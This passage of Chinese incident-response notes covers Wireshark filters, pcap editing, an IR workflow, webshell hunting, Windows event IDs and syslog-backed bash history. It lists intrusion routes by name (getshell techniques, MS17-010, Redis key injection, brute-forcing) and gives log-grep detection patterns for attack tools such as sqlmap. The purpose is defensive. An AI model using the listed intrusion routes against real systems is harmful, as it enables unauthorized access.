端口过滤。如过滤80端口，在Filter中输入，tcp.port==80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport==80只过滤目的端口为80的，tcp.srcport==80只过滤源端口为80的包；

使用wireshark常用的过滤命令
协议过滤比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议；

使用wireshark常用的过滤命令
http模式过滤。如过滤get包，http.request.method=="GET",过滤post包，http.request.method=="POST"；

使用wireshark常用的过滤命令
连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。
```

pcap文件过滤和合并：

```
通过 editcap， 我们能以很多不同的规则来过滤 pcap 文件中的内容，并且将过滤结果保存到新文件中。

首先，以“起止时间”来过滤 pcap 文件。 " - A < start-time > 和 " - B < end-time > 选项可以过滤出在这个时间段到达的数据包（如，从 2:30 ～ 2:35）。时间的格式为 “ YYYY-MM-DD HH:MM:SS"。

$ editcap -A '2014-12-10 10:11:01'-B '2014-12-10 10:21:01' input.pcap output.pcap
也可以从某个文件中提取指定的 N 个包。下面的命令行从 input.pcap 文件中提取100个包（从 401 到 500）并将它们保存到 output.pcap 中：

$ editcap input.pcap output.pcap 401-500
使用 "-D < dup-window >" （dup-window可以看成是对比的窗口大小，仅与此范围内的包进行对比）选项可以提取出重复包。每个包都依次与它之前的 < dup-window > -1 个包对比长度与MD5值，如果有匹配的则丢弃。

$ editcap -D 10 input.pcap output.pcap
遍历了 37568 个包, 在 10 窗口内重复的包仅有一个，并丢弃。

也可以将 < dup-window > 定义成时间间隔。使用"-w < dup-time-window >"选项，对比< dup-time-window > 时间内到达的包。

$ editcap -w 0.5 input.pcap output.pcap
检索了 50000 个包, 以0.5s作为重复窗口，未找到重复包。

分割 pcap 文件
当需要将一个大的 pcap 文件分割成多个小文件时，editcap 也能起很大的作用。

将一个 pcap 文件分割成数据包数目相同的多个文件

$ editcap -c <packets-per-file><input-pcap-file><output-prefix>
输出的每个文件有相同的包数量，以 < output-prefix >-NNNN的形式命名。

以时间间隔分割 pcap 文件

$ editcap -i <seconds-per-file><input-pcap-file><output-prefix>
合并 pcap 文件
如果想要将多个文件合并成一个，用 mergecap 就很方便。

当合并多个文件时，mergecap 默认将内部的数据包以时间先后来排序。

$ mergecap -w output.pcap input.pcap input2.pcap [input3.pcap ...]
如果要忽略时间戳，仅仅想以命令行中的顺序来合并文件，那么使用 -a 选项即可。

例如，下列命令会将 input.pcap 文件的内容写入到 output.pcap, 并且将 input2.pcap 的内容追加在后面。

$ mergecap -a -w output.pcap input.pcap input2.pcap
总结
在这篇指导中，我演示了多个 editcap、 mergecap 操作 pcap 文件的例子。除此之外，还有其它的相关工具，如 reordercap用于将数据包重新排序，text2pcap 用于将 pcap 文件转换为文本格式， pcap-diff用于比较 pcap 文件的异同，等等。当进行网络入侵测试及解决网络问题时，这些工具与包注入工具非常实用，所以最好了解他们.
```


### 入侵方式分析

滚雪球式线性拓展


```
a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
```

常见的入侵方式Getshell方法

```
a) WEB入侵
```

滚雪球式线性拓展

```
a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
```

常见的入侵方式Getshell方法

```
a) WEB入侵
i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell
ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞
b) 系统入侵
i. SSH 破解后登录操作
ii. RDP 破解后登录操作
iii. MSSQL破解后远控操作
iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）
c) 典型应用

i. Mail暴力破解后信息挖掘及漏洞利用
ii. VPN暴力破解后绕过边界
iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行
iv. Rsync 未授权访问类
v. Mongodb未授权访问类
vi. Elasticsearch命令执行漏洞
vii. Memcache未授权访问漏洞
viii. 服务相关口令（mysql ldap zebra squid vnc smb）
```


### 应急大致流程

- 询问（问：1.当前情况。主要是问当前发现了哪些异常；2.服务器组件部署情况；3.是否处于内网环境？是否还有其他关联服务器？4.如果当前服务器上部署了web应用还需要问这个项目是否经过安全测试？）

- 事件处理
需要依据对项目组询问的结果进行排查，心里大概列出攻击者可能通过哪几条路进来并且在心里进行排序。这块的依据是基础知识那块的第二点，能不能快速的找到问题取决于你是否了解常见的攻击套路。

- 初步对事件进行判断，是否需要关停业务或者是否需要隔离被攻击主机，是否需要对被攻击主机进行断网等等，防止损失/危害进一步扩大。

- 建讨论组。拉相关人员进组方便沟通交流（一般包括：项目组运维、开发、领导、我方的事件处理人员、领导）

- 依据上一步的排序结果进行对应日志调取，需要注意的是：日志不要在线上服务器进行分析，将线上日志打包下载回本地。不要在线上服务器进行任何多余的操作，操作的时候要小心小心再小心。可以让项目组的韵味取日志之后再发给你。对日志进行分析（考虑到我们这边项目的特征一般采用Linux下shell分析的方式，对于windows自带的事件日志一般采用splunk或者windows自带的日志分析工具或者log parser）比如通过询问了解到这台被黑的服务器用到了tomcat并且manager也存在弱口令，那么你首先需要调取的就是tomcat的日志，因为tomcat manager的入侵是需要上传war包，所以你的语句应该是：
```
cat log.log | grep -i ".war"
```

- 如果上一步骤中你找到了异常的war包（看文件名看上传时间）那么需要在服务器中找到这个war包下载到本地进行分析（主要分析是否是恶意的war包，如果是他的主要作用是什么）依据war包第一次上传的时间为准通过日志整理出攻击者的攻击时间线，依据时间线进行整体的入侵行为分析。分析攻击者在这个时间段内做了什么。

- 如果被黑服务器处在内网还需要对内网其他服务器进行分析，是否存在被黑的情况，重点关注和被黑服务器共享同一密码的服务器。

- 如果服务器中存在恶意的二进制文件，需要对二进制文件进行分析。使用IDA Pro对恶意文件进行静态分析，使用在线文件分析平台（金山火眼、文件B超、virustotal等等）对恶意文件进行动态分析。结合两者的分析结果判定恶意文件的行为，例如是否会对服务器系统文件进行替换？是否感染了系统其他关键文件？是否将自身写入开机启动项？同时可以将恶意文件的md5值放到网上搜索看看有没有人已经对该恶意文件进行过分析。

- 确定此次事件的影响大小。

- 报告


### 基本应急建议


Kill恶意进程：
> 32位用wsyscheck，从自启动、服务里找，最重要的是杀白金这类注入进程的需要他的卸载模块功能，你kill进程立即重启。

> 64位任务管理器加注册表编辑器足够了，右键转至服务非常好用，除了挖矿的，其他的木马后门都会*32，直接kill，kill不了的注册表里改了然后重启。


WEBSHELL寻找：

> 1）扫描特征
> 通常日志中会伴随一些其他攻击特征，例如可以用如下语句
> egrep '(select|script|acunetix|sqlmap)' /var/log/httpd/access_log

> 2）访问频次
> 重点关注POST请求
> grep 'POST' /var/log/httpd/access_log | awk '{print $1}' | sort | uniq -c | sort -nr

> 3）Content-Length
> Content-Length过大的请求，例如过滤Content-Length大于5M的日志
> awk '{if($10>5000000){print $0}}' /var/log/httpd/access_log

> 注意
> 这里如果发现文件，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。
> 

基本建议：
> C:\Users\XXX\Desktop 新建用户的桌面，可能会有残留文件
> 查看杀毒软件日志
> 查看安全性日志，是否存在大量审核失败的日志（暴力破解）若该帐号本身已被删除，则"用户"处将不会显示帐号名，而是显示一串帐号的SID值。
> 查看安全性日志，特殊事件，比如说648特殊事件为创建账户事件

这里列举一些有关检测时常见的事件ID:

```
事件ID：517     审核日志已经清除
事件ID：528     登陆成功                      可以显示客户端连接ip地址
事件ID：529   登录失败。试图使用未知的用户名或已知用户名但错误密码进行登录
事件ID：683     会话从 winstation 中断连接     可以查看客户端计算机名
事件ID：624     创建了用户帐户
事件ID：626     启用了用户帐户
事件ID：627     用户密码已更改
事件ID：628     设置了用户密码
事件ID：630   用户帐户已删除。
事件ID：632： 成员已添加至全局组
事件ID：635： 已新建本地组。 
事件ID：643： 域策略已修改。
```
必要时配置下history

1、命令历史记录中加时间


```
默认情况下如下图所示，没有命令执行时间，不利于审计分析。

通过设置export HISTTIMEFORMAT='%F %T '，让历史记录中带上命令执行时间。

注意”%T”和后面的”’”之间有空格，不然查看历史记录的时候，时间和命令之间没有分割。

要一劳永逸，这个配置可以写在/etc/profile中，当然如果要对指定用户做配置，这个配置可以写在/home/$USER/.bash_profile中。

本文将以/etc/profile为例进行演示。

要使配置立即生效请执行source /etc/profile，我们再查看history记录，可以看到记录中带上了命令执行时间。

如果想要实现更细化的记录，比如登陆过系统的用户、IP地址、操作命令以及操作时间一一对应，可以通过在/etc/profile里面加入以下代码实现

export HISTTIMEFORMAT="%F %T 'who -u am i 2>/dev/null| awk '{print $NF}'|sed -e 's/[()]//g ''whoami' "，注意空格都是必须的。

修改/etc/profile并加载后，history记录如下，时间、IP、用户及执行的命令都一一对应。

通过以上配置，我们基本上可以满足日常的审计工作了，但了解系统的朋友应该很容易看出来，这种方法只是设置了环境变量，攻击者unset掉这个环境变量，或者直接删除命令历史，对于安全应急来说，这无疑是一个灾难。

针对这样的问题，我们应该如何应对，下面才是我们今天的重点，通过修改bash源码，让history记录通过syslog发送到远程logserver中，大大增加了攻击者对history记录完整性破坏的难度。
```



2、修改bash源码，支持syslog记录


```
首先下载bash源码，可以从gnu.org下载，这里不做详细说明了，系统需要安装gcc等编译环境。我们用bash4.4版本做演示。

修改源码：bashhist.c

修改源码config-top.h，取消/#define SYSLOG_HISTORY/这行的注释

编译安装，编译过程不做详细说明，本文中使用的编译参数为： ./configure –prefix=/usr/local/bash，安装成功后对应目录如下：

此时可以修改/etc/passwd中用户shell环境，也可以用编译好的文件直接替换原有的bash二进制文件，但最好对原文件做好备份。

替换时要注意两点:

1、一定要给可执行权限，默认是有的，不过有时候下载到windows系统后，再上传就没有可执行权限了，这里一定要确定，不然你会后悔的；

2、替换时原bash被占用，可以修改原用户的bash环境后再进行替换。

查看效果，我们发现history记录已经写到了/var/log/message中。

如果要写到远程logserver，需要配置syslog服务，具体配置这里不做详细讲解，大家自己研究，发送到远端logserver效果如下图所示。

通过以上手段，可以有效保证history记录的完整性，避免攻击者登录系统后，通过取消环境变量、删除history记录等方式抹掉操作行为，为安全审计、应急响应等提供了完整的原始数据
```


#### 后记

本文将持续更新，将作者遇到的一些应急的内容和技巧添加到里面，其中有部分内容参考了各大安全论坛的资料，再次感谢其他作者的付出。
